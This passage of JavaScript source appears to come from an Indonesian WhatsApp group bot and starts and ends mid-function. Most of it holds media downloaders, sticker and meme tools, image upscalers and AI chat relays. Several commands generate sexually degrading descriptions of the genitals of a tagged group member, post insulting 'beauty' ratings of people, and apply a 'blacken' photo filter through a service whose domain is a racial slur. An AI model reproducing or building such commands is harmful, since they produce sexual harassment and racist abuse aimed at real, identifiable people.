if (!text) return m.reply(example("nama nya mana pea"))

let who = m.mentionedJid[0] 
? m.mentionedJid[0] 
: m.quoted 
? m.quoted.sender 
: m.sender;

// data random
let warnaList = ["hitam", "coklat", "pink", "abu-abu", "merah", "orange,", "kuning", "biru", "titanium"]
let ukuranList = ["kecil", "sedang", "besar", "sangat kecil", " sangat besar", "oversize"]
let kondisiList = ["belom sunat", "sudah sunat"," hitam berdaki", "miring kesamping", " biji nya ga simetris ", "ga bisa ngaceng"]

let pickRandom = (list) => list[Math.floor(Math.random() * list.length)]

let name = await getName(sock, m.sender)
let warna = pickRandom(warnaList)
let ukuran = pickRandom(ukuranList)
let kondisi = pickRandom(kondisiList)

m.reply(
`*Hasil Pengecekan Kontol*
-------------------------------------------
- *Nama*    : ${text}
- *Warna*   : ${warna}
- *Ukuran*  : ${ukuran}
- *Kondisi* : ${kondisi}

> © andri store`,
{ mentions: [who] }
)
}
break

        
case "cekmemek": {

if (!text) return m.reply(example("namanya mana pea"))

let who = m.mentionedJid[0] 
? m.mentionedJid[0] 
: m.quoted 
? m.quoted.sender 
: m.sender;

// data random
let warnaList = ["pink", "merah muda", "kehitaman", "putih", "kuning", "hijau muda"," biru muda"]
let ukuranList = ["sempit", "sedang", "lebar", "oversize", "sangat lebar", "sangat sempit"]
let kondisiList = ["masih fresh", "sudah berpengalaman", "perawan", "butuh perhatian", "udah longgar", "berkurap", "berjamur"]

let pickRandom = (list) => list[Math.floor(Math.random() * list.length)]

let name = await getName(sock, m.sender)
let warna = pickRandom(warnaList)
let ukuran = pickRandom(ukuranList)
let kondisi = pickRandom(kondisiList)

m.reply(
`*Hasil Pengecekan Meki*
-------------------------------------------
- *Nama*    : ${text}
- *Warna*   : ${warna}
- *Ukuran*  : ${ukuran}
- *Kondisi* : ${kondisi}

> © andri store`,
{ mentions: [who] }
)
}
break

        
case "cantikcek":
case "cekcantik": {
  let who = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : m.sender

  let name = await getName(sock, who)

  let cantikk = [
    'Cantik Level : 4%\n\nINI MUKA ATAU SAMPAH?!',
    'Cantik Level : 7%\n\nSerius ya,, lu mirip monyet kelaperan',
    'Cantik Level : 12%\n\nMuka lu bikin orang batal makan',
    'Cantik Level : 22%\n\nDosa lu numpuk sampe nutup aura 😭',
    'Cantik Level : 27%\n\nJodoh? Kayaknya lagi libur',
    'Cantik Level : 35%\n\nYang sabar ya, masih proses',
    'Cantik Level : 41%\n\nMinimal niat dulu buat cantik',
    'Cantik Level : 48%\n\nCowok liat lu auto logout',
    'Cantik Level : 56%\n\nSetengah cantik, setengah bikin trauma',
    'Cantik Level : 64%\n\nUdah mendingan lah dikit',
    'Cantik Level : 71%\n\nLumayan, ga bikin kaget',
    'Cantik Level : 2%\n\nAWOAKAK BURIQQQ PARAH!!!',
    'Cantik Level : 1%\n\nINI MAH ERROR MUKA 😭',
    'Cantik Level : 77%\n\nMulai aman, ga bikin orang kabur',
    'Cantik Level : 83%\n\nCowok ga bakal nyesel ngeliat lu',
    'Cantik Level : 89%\n\nAuto jadi pusat perhatian',
    'Cantik Level : 94%\n\nBAHAYA INI CANTIKNYA',
    'Cantik Level : 100%\n\nFix bidadari nyasar 😳'
  ]

  let hasil = cantikk[Math.floor(Math.random() * cantikk.length)]

  await sock.sendMessage(m.chat, { react: { text: "💄", key: m.key } })

  m.reply(
    `💅 *CEK KECANTIKAN*\n\n` +
    `👤 *Nama:* @${who.split("@")[0]}\n\n` +
    `${hasil}\n\n` +
    `> © Andri Store`,
    { mentions: [who] }
  )
}
break

        
        
case "hitamin": {
  try {
    const quoted = m.quoted ? m.quoted : m
    const mime = quoted.mimetype || ""

    if (!/image/.test(mime))
      return m.reply("❌ Reply gambar dengan caption *hitamin*")

    await sock.sendMessage(m.chat, { react: { text: "🧭", key: m.key } })

    const mediaPath = await sock.downloadAndSaveMediaMessage(quoted)
    const buffer = fs.readFileSync(mediaPath)
    const base64Image = buffer.toString("base64")

    const response = await axios.post(
      "https://negro.consulting/api/process-image",
      {
        filter: "hitam",
        imageData: "data:image/png;base64," + base64Image
      },
      {
        headers: {
          "Content-Type": "application/json"
        }
      }
    )

    const resultBuffer = Buffer.from(
      response.data.processedImageUrl.replace(
        /^data:image\/png;base64,/,
        ""
      ),
      "base64"
    )

    await sock.sendMessage(
      m.chat,
      {
        image: resultBuffer,
        caption: "✅ Selesai, filter *HITAM* berhasil diterapkan"
      },
      { quoted: m }
    )

    fs.unlinkSync(mediaPath)
    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

  } catch (err) {
    console.error(err)
    m.reply("❌ Gagal memproses gambar")
  }
}
break
        
        
        
// =========== ENDD ============ // 
        
case 'playch':
case 'playchannel': {
    if (!isAn) return m.reply(mess.owner)
    if (!text) return m.reply(`Contoh:\n${prefix}${command} judul lagu`)
    if (!global.idCh) return m.reply('❌ ID channel belum diset di settings.js')

    try {
        m.reply('🎧 Memproses lagu, mohon tunggu...')

        const api = `https://api.elrayyxml.web.id/api/downloader/ytplay?q=${encodeURIComponent(text)}`
        const { data } = await axios.get(api)

        if (!data?.result) return m.reply('❌ Lagu tidak ditemukan.')

        const {
            title,
            thumbnail,
            download_url,
            url: youtubeUrl
        } = data.result

        
        const audioRes = await axios.get(download_url, {
            responseType: 'arraybuffer',
            headers: { 'User-Agent': 'Mozilla/5.0' }
        })

        const tempIn = path.join(os.tmpdir(), `${Date.now()}_in.mp3`)
        const tempOut = path.join(os.tmpdir(), `${Date.now()}_out.opus`)
        fs.writeFileSync(tempIn, Buffer.from(audioRes.data))

        
        await new Promise((resolve, reject) => {
            exec(
                `ffmpeg -y -i "${tempIn}" -c:a libopus -b:a 128k "${tempOut}"`,
                err => err ? reject(err) : resolve()
            )
        })

        
        let thumbBuffer = null
        if (thumbnail) {
            try {
                const thumb = await axios.get(thumbnail, {
                    responseType: 'arraybuffer',
                    timeout: 10000
                })
                thumbBuffer = Buffer.from(thumb.data)
            } catch {}
        }

        const newsletterInfo = {
            newsletterJid: global.idCh,
            serverMessageId: 100,
            newsletterName: global.namaBot
        }

        await sock.sendMessage(global.idCh, {
            audio: fs.readFileSync(tempOut),
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: newsletterInfo,
                externalAdReply: {
                    title: title.slice(0, 60),
                    body: global.namaBot,
                    thumbnail: thumbBuffer,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: youtubeUrl,
                    mediaUrl: youtubeUrl,
                    showAdAttribution: false
                }
            }
        })

        fs.unlinkSync(tempIn)
        fs.unlinkSync(tempOut)

        m.reply(`✅ Lagu berhasil dikirim ke channel\n🎵 *${title}*`)
    } catch (e) {
        console.error(e)
        m.reply('❌ Terjadi kesalahan saat memproses lagu.')
    }
}
break

    
        
//========== Tiktok        
function formatNumber(n) {
  return Number(n || 0).toLocaleString("id-ID");
}

function formatDuration(sec) {
  if (!sec) return "00:00";
  const m = Math.floor(sec / 60).toString().padStart(2, "0");
  const s = Math.floor(sec % 60).toString().padStart(2, "0");
  return `${m}:${s}`;
}
        

case "tiktok":
case "tt":
case "ttsearch":  {
  try {
    const input = m.quoted?.text || text;
    if (!input)
      return m.reply(`*TIKTOK DOWNLOADER & TIKTOK SEARCH*

• Download:
  ${prefix + command} mana link nya dongo

• Search:
  ${prefix + command} Mukbang Sapi thailand
`);

await sock.sendMessage(m.chat, { react: { text: '🧭', key: m.key } })      
    const regex = /(https:\/\/(vt|vm)\.tiktok\.com\/[^\s]+|https:\/\/www\.tiktok\.com\/@[\w.-]+\/video\/\d+)/;
    const url = input.match(regex)?.[0];

    // ================= DOWNLOAD MODE =================
    if (url) {
      const res = await fetch(`https://www.tikwm.com/api/?url=${url}&hd=1`);
      const json = await res.json();
      if (!json?.data) return m.reply("❌ Gagal mengambil data TikTok");
        
      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })  

      const d = json.data;

      let info = `*TIKTOK DOWNLOADER*

📌 *Judul:* ${d.title || "-"}
🌍 *Region:* ${d.region || "-"}
⏱️ *Durasi:* ${formatDuration(d.duration)}
👁️ *Views:* ${formatNumber(d.play_count)}
💬 *Komentar:* ${formatNumber(d.comment_count)}
🔁 *Share:* ${formatNumber(d.share_count)}
👤 *Uploader:* ${d.author?.nickname || d.author?.unique_id || "-"}
`;
      await m.reply(info);

     // ===== foto slide =====
if (d.images?.length) {
  if (d.images.length === 1) {
    await sock.sendMessage(
      m.chat,
      { image: { url: d.images[0] } },
      { quoted: m }
    );
  } else {
    for (let i = 0; i < d.images.length; i++) {
      await sock.sendMessage(
        m.chat,
        {
          image: { url: d.images[i] },
          caption: i === 0 ? d.title || "" : ""
        },
        { quoted: m }
      );
    }
  }
}

      // ===== video =====
      else {
        await sock.sendMessage(
          m.chat,
          { video: { url: d.play }, caption: d.title || "" },
          { quoted: m }
        );
      }

      // ===== audio =====
      if (d.music_info?.play) {
        await sock.sendMessage(
          m.chat,
          {
            audio: { url: d.music_info.play },
            mimetype: "audio/mpeg",
            fileName: `${d.title || "tiktok"}.mp3`
          },
          { quoted: m }
        );
      }

    // ================= SEARCH MODE =================
    } else {
      const res = await fetch(
        `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(
          input
        )}&count=1&cursor=0&web=1&hd=1`
      );
      const json = await res.json();
      const v = json?.data?.videos?.[0];
      if (!v) return m.reply("❌ Video tidak ditemukan");
        
     await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

      let caption = `*TIKTOK SEARCH*

📌 *Judul:* ${v.title}
🌍 *Region:* ${v.region}
⏱️ *Durasi:* ${formatDuration(v.duration)}
👁️ *Views:* ${formatNumber(v.play_count)}
💬 *Komentar:* ${formatNumber(v.comment_count)}
🔁 *Share:* ${formatNumber(v.share_count)}
👤 *Uploader:* ${v.author.nickname || v.author.unique_id}
`;

      await sock.sendMessage(
        m.chat,
        {
          video: { url: "https://www.tikwm.com" + v.play },
          caption
        },
        { quoted: m }
      );
    }
  } catch (e) {
    console.error(e);
    m.reply("❌ Terjadi kesalahan saat memproses TikTok");
  }
}
break;
    
case "ig":
case "igdl":
case "instagram": {
  if (!text) return m.reply("Masukkan link Instagram")

  const url = text.match(/https?:\/\/(www\.)?instagram\.com\/[^\s]+/i)?.[0]
  if (!url) return m.reply("Link Instagram tidak valid")

  m.reply("📥 Wait mengunduh Instagram (video + audio)...")

  try {
    const { videoPath, audioPath } = await igAuto(url)

    // kirim video
    await sock.sendMessage(
      m.chat,
      { video: fs.readFileSync(videoPath), caption: "🎬 Instagram Download" },
      { quoted: m }
    )

    // kirim audio
    await sock.sendMessage(
      m.chat,
      {
        audio: fs.readFileSync(audioPath),
        mimetype: "audio/mpeg",
        fileName: "instagram.mp3"
      },
      { quoted: m }
    )

    fs.unlinkSync(videoPath)
    fs.unlinkSync(audioPath)
  } catch (e) {
    console.error(e)
    m.reply("❌ Gagal download Instagram")
  }
}
break

case "fb":
case "facebook": {
  try {
    if (!text)
      return m.reply(
        `*FACEBOOK DOWNLOADER*

• Download:
  ${prefix + command} https://facebook.com/xxxxx`
      )

    await sock.sendMessage(m.chat, { react: { text: "🧭", key: m.key } })

    const results = await fbDownloader(text)
    if (!results.length) return m.reply("❌ Video tidak ditemukan")

    // ambil kualitas terbaik (biasanya index 0)
    const video = results[0]

    await sock.sendMessage(m.chat, { react: { text: "⬇️", key: m.key } })

    await sock.sendMessage(
      m.chat,
      {
        video: { url: video.url },
        caption: `〽️ *FACEBOOK DOWNLOADER*

 *Kualitas:* ${video.quality}
 *Source:* Facebook`
      },
      { quoted: m }
    )

    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
  } catch (e) {
    console.error(e)
    m.reply("❌ Gagal mengunduh video Facebook")
  }
}
break
    
case 'play': {
    if (!text) return m.reply('❗ Contoh: .play dj tiktok')

    await sock.sendMessage(m.chat, {
        react: { text: '🔎', key: m.key }
    })

    const result = await playYt(text)

    if (!result) {
        return m.reply('❌ Lagu tidak ditemukan atau semua API gagal.')
    }

    let caption = `⚡ Judul Lagu: *${result.title || 'Unknown Title'}*
👤 Author: *${result.channel || 'Unknown Channel'}*
🔗 Link URL ${result.url || '-'}

⏳ Wait Mengirim audio...`

    await sock.sendMessage(m.chat, {
        image: { url: result.cover },
        caption
    }, { quoted: m })

    await sock.sendMessage(m.chat, {
        audio: { url: result.download },
        mimetype: 'audio/mpeg'
    }, { quoted: m })

}
break

  case 'ytmp3': {
    if (!text) return m.reply('❗ Contoh: .ytmp3 https://youtube.com/watch?v=xxxx')

    await sock.sendMessage(m.chat, {
        react: { text: '🎧', key: m.key }
    })

    const result = await ytMp3(text)
    if (!result) return m.reply('❌ Gagal convert audio.')

    let caption = `🎵 *${result.title}*
👤 *${result.channel}*
⏳ Mengirim audio...`

    await sock.sendMessage(m.chat, {
        image: { url: result.cover },
        caption
    }, { quoted: m })

    await sock.sendMessage(m.chat, {
        audio: { url: result.download },
        mimetype: 'audio/mpeg'
    }, { quoted: m })
}
break

case "pinterest":
case "pin": {
    if (!text) return m.reply(example("Anime Douchin 6 max 6 foto ya bre"))

    m.reply("⏳ Tunggu sebentar Bang/kak, sedang mengambil gambar...")

    let jumlah = 6
    let argsText = args
    const lastArg = args[args.length - 1]

    if (!isNaN(lastArg)) {
        jumlah = Math.min(Math.max(parseInt(lastArg), 1), 10)
        argsText = args.slice(0, -1)
    }

    const query = argsText.join(" ")

    try {
        const { data } = await axios.get(
            `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(query)}`
        )

        if (!data.status || !data.data?.length) {
            return m.reply("❌ Gambar tidak ditemukan.")
        }

        const results = data.data
            .sort(() => Math.random() - 0.5)
            .slice(0, jumlah)

        async function createImage(url) {
            const { imageMessage } = await generateWAMessageContent(
                { image: { url } },
                { upload: sock.waUploadToServer }
            )
            return imageMessage
        }

        let cards = []
        let i = 1

        for (let item of results) {
            cards.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: `Hasil gambar ke-${i++}`
                }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    text: "ANDRI STORE"
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: query,
                    hasMediaAttachment: true,
                    imageMessage: await createImage(item.image_url)
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Get Pinterest",
                                url: item.pin,
                                merchant_url: item.pin
                            })
                        }
                    ]
                })
            })
        }

        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `📌 *Hasil Pencarian Pinterest*\n🔎 Type: ${query}\n👤 Permintaan: @${m.pushName}`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© ANDRI STORE ID"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards
                            })
                        })
                    }
                }
            },
            { quoted: m }
        )

        await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

    } catch (e) {
        console.error(e)
        m.reply("❌ Terjadi kesalahan saat mengambil gambar.")
    }
}
break

case "iqc": {
    if (!text) return m.reply(example("teks quote nya bre mana"))

    await sock.sendMessage(
        m.chat,
        { react: { text: "🧭", key: m.key } }
    )

    try {
        const jam = new Date().toLocaleTimeString("id-ID", {
            timeZone: "Asia/Jakarta",
            hour: "2-digit",
            minute: "2-digit"
        })

        const batre = Math.floor(Math.random() * 90) + 5

        const apiUrl = `https://api-faa.my.id/faa/iqcv2?prompt=${encodeURIComponent(text)}&jam=${encodeURIComponent(jam)}&batre=${batre}`

        const res = await axios.get(apiUrl, {
            responseType: "arraybuffer"
        })

await sock.sendMessage(
        m.chat,
        { react: { text: "✅", key: m.key } }
    )
    
        const buffer = Buffer.from(res.data)

        await sock.sendMessage(
            m.chat,
            {
                image: buffer,
                caption: `🖼️ *Image Quote Creator*\n\n"${text}"`
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("IQC Error:", err)
        m.reply("❌ Gagal membuat image quote.")
    }
}
break

case "getpp": {
    if (!m.quoted && !m.mentionedJid?.length) {
        return m.reply(
            example(`Tag atau reply user target.\n\nContoh: *${prefix + command} @user*`)
        )
    }

    await sock.sendMessage(
        m.chat,
        { react: { text: "🧭", key: m.key } }
    )

    try {
        let target
        if (m.quoted) {
            target = m.quoted.sender
        } else if (m.mentionedJid?.length) {
            target = m.mentionedJid[0]
        } else {
            target = m.sender
        }

        const no = target.split("@")[0]

        let pp
        try {
            pp = await sock.profilePictureUrl(target, "image")
        } catch {
            return m.reply("❌ User tidak punya foto profil atau disembunyikan.")
        }

    await sock.sendMessage(
        m.chat,
        { react: { text: "✅", key: m.key } }
    )
    
        await sock.sendMessage(
            m.chat,
            {
                image: { url: pp },
                caption: `Berhasil ambil Foto profil @${no}`,
                mentions: [target]
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("GETPP Error:", err)
        m.reply("❌ Gagal mengambil foto profil.")
    }
}
break

case "bratvid": {
    if (!text) return m.reply(example("teksnya mana bree"))

    try {
        await sock.sendMessage(
            m.chat,
            { react: { text: "🧭", key: m.key } }
        )

        const url = `https://api-faa.my.id/faa/bratvid?text=${encodeURIComponent(text)}`
        const res = await axios.get(url, { responseType: "arraybuffer" })
        
        await sock.sendMessage(
            m.chat,
            { react: { text: "✅", key: m.key } }
        )

        await sock.sendVideoAsSticker(
            m.chat,
            res.data,
            m,
            {
                packname: global.packname,
                author: global.author
            }
        )

    } catch (err) {
        console.error("BRATVID Error:", err)
        m.reply("❌ Gagal membuat stiker brat video.")
    }
}
break

case "smeme": {
    if (!/image|webp/.test(mime)) {
        return m.reply(
            example("Kirim atau reply gambar/webp dengan teks atas|bawah")
        )
    }

    let [atas, bawah] = text.split("|")
    if (!atas) return m.reply(example("teksatas|teksbawah (bawah opsional)"))

    await sock.sendMessage(
        m.chat,
        { react: { text: "🧭", key: m.key } }
    )

    let tempFile
    try {
        // 1️⃣ Download media
        tempFile = await sock.downloadAndSaveMediaMessage(qmsg)

        // 2️⃣ Upload ke Uguu / Catbox
        const uploadedUrl = await uploader.uguu(tempFile)

        // 3️⃣ Panggil API smeme
        const apiUrl = `https://api.ryuu-dev.offc.my.id/tools/smeme?img=${encodeURIComponent(uploadedUrl)}&atas=${encodeURIComponent(atas)}&bawah=${encodeURIComponent(bawah || "")}`
        const res = await axios.get(apiUrl, { responseType: "arraybuffer" })
        
    await sock.sendMessage(
        m.chat,
        { react: { text: "✅", key: m.key } }
    )

        // 4️⃣ Kirim sebagai stiker
        await sock.sendImageAsSticker(
            m.chat,
            res.data,
            m,
            {
                packname: global.packname,
                author: global.author
            }
        )

    } catch (err) {
        console.error("SMEME Error:", err)
        m.reply("❌ Terjadi kesalahan saat membuat meme.")
    } finally {
        // 5️⃣ Hapus file sementara
        try {
            if (tempFile && fs.existsSync(tempFile)) {
                fs.unlinkSync(tempFile)
            }
        } catch (e) {
            console.error("Cleanup Error:", e)
        }
    }
}
break

case "upswgc":
case "swgc":
case "swgrup": {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isAdmin) return m.reply(mess.admin)
    if (!isBotAdmin) return m.reply(mess.botAdmin)

    const qmsg = m.quoted ? m.quoted : m
    const mime = (qmsg.msg || qmsg).mimetype || ""
    const caption = text
        .replace(new RegExp(`^${prefix + command}\\s*`, "i"), "")
        .trim()

    if (!mime && !caption) {
        return m.reply(example("Halo semua (opsional reply media)"))
    }

    await sock.sendMessage(
        m.chat,
        { react: { text: "🧭", key: m.key } }
    )

    try {
        async function groupStatus(sock, jid, content) {
            const { backgroundColor } = content
            delete content.backgroundColor

            const inside = await generateWAMessageContent(content, {
                upload: sock.waUploadToServer,
                backgroundColor
            })

            const messageSecret = randomBytes(32)

            const msg = generateWAMessageFromContent(
                jid,
                {
                    messageContextInfo: { messageSecret },
                    groupStatusMessageV2: {
                        message: {
                            ...inside,
                            messageContextInfo: { messageSecret }
                        }
                    }
                },
                {}
            )

            await sock.relayMessage(jid, msg.message, {
                messageId: msg.key.id
            })

            return msg
        }

        let payload = {}

        if (/image/.test(mime)) {
            const buffer = await qmsg.download()
            payload = {
                image: buffer,
                caption
            }
        } else if (/video/.test(mime)) {
            const buffer = await qmsg.download()
            payload = {
                video: buffer,
                caption
            }
        } else if (/audio/.test(mime)) {
            const buffer = await qmsg.download()
            payload = {
                audio: buffer,
                mimetype: "audio/mp4"
            }
        } else if (caption) {
            payload = {
                text: caption
            }
        }

        await groupStatus(sock, m.chat, payload)

        m.reply("✅ Status grup berhasil diposting.")
    } catch (err) {
        console.error("UPSWGC Error:", err)
        m.reply("❌ Gagal upload status grup.")
    }
}
break

case "mediafire":
case "mf": {
    if (!text) return m.reply(example("https://www.mediafire.com/file/xxxx/file"))

    if (!/mediafire\.com/.test(text)) {
        return m.reply("❌ Link bukan MediaFire.")
    }

    await sock.sendMessage(
        m.chat,
        { react: { text: "🧭", key: m.key } }
    )

    try {
        const data = await mediafireScrape(text)

        if (!data.link) {
            return m.reply("❌ Gagal mengambil link download.")
        }

        let caption = `📦 *MEDIAFIRE DOWNLOADER*\n`
        caption += `📄 Nama : ${data.title}\n`
        caption += `📊 Size : ${data.size}\n`
        caption += `📁 Type : ${data.mimetype}\n`
        caption += `⏬ Wait Mengirim file...`
        
    await sock.sendMessage(
        m.chat,
        { react: { text: "✅", key: m.key } }
    )

        await sock.sendMessage(
            m.chat,
            {
                image: { url: data.image },
                caption
            },
            { quoted: m }
        )

        await sock.sendMessage(
            m.chat,
            {
                document: { url: data.link },
                fileName: data.title,
                mimetype: data.mimetype
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("MEDIAFIRE Error:", err)
        m.reply("❌ Gagal mengambil file MediaFire.")
    }
}
break

case "hd":
case "remini": {
    try {
        let media = m.quoted ? m.quoted : m
        const mime = (media.msg || media).mimetype || ""

        if (!/image/.test(mime)) {
            return m.reply("Reply / kirim gambar dengan .hd")
        }

        await m.reply("Wait sedang meningkatkan kualitas gambar (HD)...")

        // download image
        const filePath = await sock.downloadAndSaveMediaMessage(media)

        // upload ke catbox
        const form = new FormData()
        form.append("fileToUpload", fs.createReadStream(filePath))
        form.append("reqtype", "fileupload")

        let uploadRes
        try {
            uploadRes = await axios.post(
                "https://catbox.moe/user/api.php",
                form,
                {
                    headers: form.getHeaders(),
                    timeout: 60000
                }
            )
        } catch (e) {
            fs.unlinkSync(filePath)
            return m.reply("❌ Gagal upload gambar")
        }

        if (!uploadRes || typeof uploadRes.data !== "string" || !uploadRes.data.startsWith("http")) {
            fs.unlinkSync(filePath)
            return m.reply("❌ Upload gambar gagal")
        }

        const imageUrl = uploadRes.data.trim()

        // request upscale
        let upscaleRes
        try {
            upscaleRes = await axios.get(
                `https://api.ryuu-dev.offc.my.id/imagecreator/upscaler4k?url=${encodeURIComponent(imageUrl)}`,
                { timeout: 120000 }
            )
        } catch (e) {
            fs.unlinkSync(filePath)
            return m.reply("❌ Gagal memproses gambar")
        }

        if (
            !upscaleRes ||
            !upscaleRes.data ||
            !upscaleRes.data.status ||
            !upscaleRes.data.result
        ) {
            fs.unlinkSync(filePath)
            return m.reply("❌ Upscale gagal")
        }

        await sock.sendMessage(
            m.chat,
            {
                image: { url: upscaleRes.data.result },
                caption: "✨ Berhasil HD Kan Gambar Anda"
            },
            { quoted: m }
        )

        // cleanup
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath)

    } catch (err) {
        console.error("HD / REMINI ERROR:", err)
        m.reply("❌ Terjadi kesalahan saat memproses gambar")
    }
}
break

case 'hdvid': {
  const q = m.quoted || m
  const mime = (q.msg || q).mimetype || ''

  if (!mime.startsWith('video/')) {
    return m.reply('Reply / kirim video untuk di-HD-kan')
  }

  await m.reply('Wait Memproses HD video yang anda minta...')

  const baseApi = 'https://api.unblurimage.ai'
  const productSerial = crypto.randomUUID().replace(/-/g, '')
  const sleep = ms => new Promise(r => setTimeout(r, ms))

  try {

    const uploadForm = new FormData()
    uploadForm.append('video_file_name', `hd-${Date.now()}.mp4`)

    const uploadResp = await axios.post(
      `${baseApi}/api/upscaler/v1/ai-video-enhancer/upload-video`,
      uploadForm,
      {
        headers: uploadForm.getHeaders(),
        timeout: 20000
      }
    )

    if (uploadResp.data.code !== 100000) {
      throw 'Gagal mendapatkan upload URL'
    }

    const { url: uploadUrl, object_name } = uploadResp.data.result

    const msg = q.msg || q
    const type = 'video'

    const stream = await downloadContentFromMessage(msg, type)

    await axios.put(uploadUrl, stream, {
      headers: { 'content-type': 'video/mp4' },
      maxBodyLength: Infinity,
      maxContentLength: Infinity,
      timeout: 0
    })

    const cdnUrl = `https://cdn.unblurimage.ai/${object_name}`

    const jobForm = new FormData()
    jobForm.append('original_video_file', cdnUrl)
    jobForm.append('resolution', '2k')
    jobForm.append('is_preview', 'false')

    const jobResp = await axios.post(
      `${baseApi}/api/upscaler/v2/ai-video-enhancer/create-job`,
      jobForm,
      {
        headers: {
          ...jobForm.getHeaders(),
          'product-serial': productSerial
        }
      }
    )

    if (jobResp.data.code !== 100000) {
      throw 'Gagal membuat job HD'
    }

    const jobId = jobResp.data.result.job_id

    let outputUrl
    const start = Date.now()

    while (!outputUrl) {
      if (Date.now() - start > 4 * 60 * 1000) {
        throw 'Timeout proses HD video'
      }

      const statusResp = await axios.get(
        `${baseApi}/api/upscaler/v2/ai-video-enhancer/get-job/${jobId}`,
        {
          headers: { 'product-serial': productSerial }
        }
      )

      if (statusResp.data?.result?.output_url) {
        outputUrl = statusResp.data.result.output_url
        break
      }

      await sleep(4000) 
    }
    await sock.sendMessage(
      m.chat,
      {
        document: { url: outputUrl },
        mimetype: 'video/mp4',
        fileName: 'HD VIDEO BY ANDRI.mp4',
        caption: 'Berhasil Meng HD Kan Video\n> maaf yee type document'
      },
      { quoted: m }
    )

  } catch (err) {
    console.error('[HDVID ERROR]', err)
    m.reply('❌ Gagal memproses HD video')
  }
}
break

case "perplexity":
case "pplx": {
    if (!text) return m.reply("Apa itu JavaScript?")

    await sock.sendMessage(
        m.chat,
        { text: "🔍 Sedang mencari informasi..." },
        { quoted: m }
    )

    try {
        let response
        try {
            response = await axios.get(
                `https://api.nexray.web.id/ai/perplexity?text=${encodeURIComponent(text)}`,
                { timeout: 30000 }
            )
        } catch (e) {
            throw "Request API gagal"
        }

        if (!response || !response.data || !response.data.result) {
            throw "Response API kosong"
        }

        const hasil = response.data.result

        const caption = `
🔍 *PERPLEXITY AI BY ANDRI*

${hasil}
        `.trim()

        await sock.sendMessage(
            m.chat,
            {
                text: caption,
                contextInfo: {
                    externalAdReply: {
                        title: "ANDRI STORE",
                        body: "Real-time Information Assistant",
                        thumbnailUrl: "https://files.catbox.moe/j1n4i7.jpg",
                        sourceUrl: "https://lynk.id/adshopdigital",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("PERPLEXITY ERROR:", err)
        m.reply("❌ Maaf, layanan AI sedang bermasalah.")
    }
}
break

case "aichat":
case "chatbot": {
    if (!text) return m.reply(example("Buatkan contoh backend server"))


    await sock.sendMessage(m.chat, {
        react: { text: "⏳", key: m.key }
    })

    try {
        const url =
            "https://zelapioffciall.koyeb.app/ai/chatbot?text=" +
            encodeURIComponent(text)

        const res = await fetch(url)
        if (!res.ok) throw new Error("Fetch gagal")

        const json = await res.json()

        if (!json || json.status !== true) {
            return m.reply("🍂 Gagal mendapatkan jawaban dari AI.")
        }

        const jawaban = json.answer || "Tidak ada jawaban."

        const caption =
            `⚡ *AI Chatbot By ANDRI STORE*\n\n` +
            `📝 *Pertanyaan user:*\n${text}\n\n` +
            `👉 *Jawaban AI:*\n${jawaban}`

        await sock.sendMessage(
            m.chat,
            { text: caption },
            { quoted: m }
        )

    } catch (err) {
        console.error("AICHAT ERROR:", err)
        m.reply("❌ Terjadi kesalahan saat memproses AI.")
    } finally {
        // hapus react
        await sock.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        })
    }
}
break

case "get2": {
    
    if (!text) return m.reply(`Contoh:\n${prefix + command} https://example.com/file`)

    await sock.sendMessage(m.chat, {
        react: { text: "⚡", key: m.key }
    })

    try {
        const res = await fetch(text)
        if (!res.ok) return m.reply(`❌ Gagal fetch (${res.status})`)

        const contentLength = res.headers.get("content-length")
        if (contentLength && Number(contentLength) > 100 * 1024 * 1024)
            return m.reply(`❌ File terlalu besar (>100MB)`)

        const contentType = res.headers.get("content-type") || ""
        const buffer = Buffer.from(await res.arrayBuffer())

        // ambil nama file
        let filename =
            text.split("/").pop()?.split("?")[0] || "file"

        
        if (contentType.startsWith("image/")) {
            return await sock.sendMessage(
                m.chat,
                { image: buffer },
                { quoted: m }
            )
        }

        
        if (contentType.startsWith("video/")) {
            return await sock.sendMessage(
                m.chat,
                { video: buffer },
                { quoted: m }
            )
        }

        
        if (contentType.startsWith("audio/")) {
            return await sock.sendMessage(
                m.chat,
                {
                    audio: buffer,
                    mimetype: contentType,
                    ptt: true
                },
                { quoted: m }
            )
        }

        
        await sock.sendMessage(
            m.chat,
            {
                document: buffer,
                mimetype: contentType || "application/octet-stream",
                fileName: filename
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("GET ERROR:", err)
